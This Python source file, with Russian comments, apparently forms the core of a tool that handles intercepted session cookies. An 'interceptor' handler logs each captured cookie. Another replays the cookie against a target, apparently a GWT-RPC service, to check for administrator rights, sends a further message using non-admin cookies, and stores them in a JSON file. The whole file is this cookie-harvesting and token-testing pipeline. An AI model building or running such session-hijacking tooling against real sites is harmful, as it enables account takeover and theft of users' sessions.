import abc
import requests
import json
from context import RequestContext
from exceptions import ChainException
from requests_to_selenium import message_test_message, message_with_cookie


class Handler(abc.ABC):
    def __init__(self, next_handler=None):
        self._next_handler = next_handler

    def set_next(self, handler):
        self._next_handler = handler
        return handler

    @abc.abstractmethod
    def handle_request(self, context: RequestContext):
        if self._next_handler:
            return self._next_handler.handle_request(context)
        return context


class SetupRequestHandler(Handler):
    def handle_request(self, context: RequestContext):
        print("SetupRequestHandler: Preparing headers...")
        return super().handle_request(context)


class LoggingHandler(Handler):
    def handle_request(self, context: RequestContext):
        print("перехватчик: Получен запрос с cookie:", context.cookie)
        return super().handle_request(context)


class AdminTokenHandler(Handler):
    def handle_request(self, context: RequestContext):
        print("AdminTokenHandler: Проверка токена на администраторский статус...")
        try:
            cookie = context.cookie.encode("latin-1", errors="ignore")
            text = message_test_message(cookie)

            if text == b"//OK[[],0,7]":
                print("Токен подтвержден как администраторский.")
                context.is_admin = True
            else:
                print("Токен не является администраторским.")
                context.is_admin = False
                message_with_cookie(cookie=cookie)
        except Exception as e:
            print(f"AdminTokenHandler: Ошибка проверки токена: {str(e)}")

        return super().handle_request(context)


class SaveClassHandler(Handler):
    def handle_request(self, context: RequestContext):
        try:
            print("SaveClassHandler: Сохранение данных класса...")
            if not context.is_admin:
                # Преобразование объекта context в словарь для сериализации
                context_data = {
                    "cookie": (
                        context.cookie.decode("utf-8")
                        if isinstance(context.cookie, bytes)
                        else context.cookie
                    ),
                    "is_admin": context.is_admin,
                }

                # Чтение существующих данных из файла
                try:
                    with open("saved_class_data.json", "r", encoding="utf-8") as f:
                        existing_data = json.load(f)
                        if not isinstance(existing_data, list):
                            existing_data = [existing_data]
                except (FileNotFoundError, json.JSONDecodeError):
                    existing_data = []

                # Добавление новых данных
                existing_data.append(context_data)

                # Запись обновленных данных в файл
                with open("saved_class_data.json", "w", encoding="utf-8") as f:
                    json.dump(existing_data, f, indent=2, ensure_ascii=False)

                print("Данные класса успешно сохранены.")
        except IOError as e:
            raise ChainException(
                f"SaveClassHandler: Ошибка сохранения данных: {str(e)}"
            )
        except TypeError as e:
            raise ChainException(
                f"SaveClassHandler: Ошибка сериализации данных: {str(e)}"
            )
        return super().handle_request(context)


class EndHadler:
    def handle_request(self, context: RequestContext):
        print("EndHandler: Завершение обработки запроса.")
        return context


class DataValidationHandler(Handler):
    def handle_request(self, context: RequestContext):
        print("DataValidationHandler: Проверка данных запроса...")
        if not context.cookie or not isinstance(context.cookie, str):
            raise ChainException(
                "DataValidationHandler: Неверный или отсутствующий URL."
            )
        print("Данные запроса успешно проверены.")
        return super().handle_request(context)


class CreateChain:
    def __init__(self):
        self.setup_handler = SetupRequestHandler()
        self.data_validation_handler = DataValidationHandler()
        self.admin_handler = AdminTokenHandler()
        self.save_handler = SaveClassHandler()
        self.logging_handler = LoggingHandler()
        self.end_handler = EndHadler()

    def create_base_chain(self):
        self.setup_handler.set_next(self.data_validation_handler).set_next(
            self.admin_handler
        ).set_next(self.save_handler).set_next(self.logging_handler).set_next(
            self.end_handler
        )
        return self.setup_handler

    def create_chain(self, **kwargs):
        for key, value in kwargs.items():
            if hasattr(self, key):
                handler = getattr(self, key)
                handler.set_next(value)
        return self.setup_handler
